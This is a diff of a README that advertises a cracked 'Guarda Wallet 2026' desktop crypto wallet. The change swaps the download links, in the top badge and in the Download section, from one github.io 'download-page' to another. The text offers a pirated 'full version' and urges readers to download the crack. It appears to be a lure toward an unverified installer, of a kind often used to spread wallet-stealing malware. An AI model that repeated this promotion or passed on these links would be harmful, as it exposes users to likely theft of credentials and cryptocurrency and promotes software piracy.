@@ -2,7 +2,7 @@
 
 Guarda Wallet 2026 Desktop Full Version is the ultimate tool for cryptocurrency enthusiasts seeking a secure and comprehensive wallet solution on Windows. This version unlocks all features, providing full access to multi-crypto support and enhanced desktop management. Download Guarda Wallet crack today to experience seamless financial control and take your crypto portfolio to the next level.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -90,7 +90,7 @@ A5: Guarda Wallet provides easy backup options. Go to Settings > Backup and foll
 
 ## Download
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
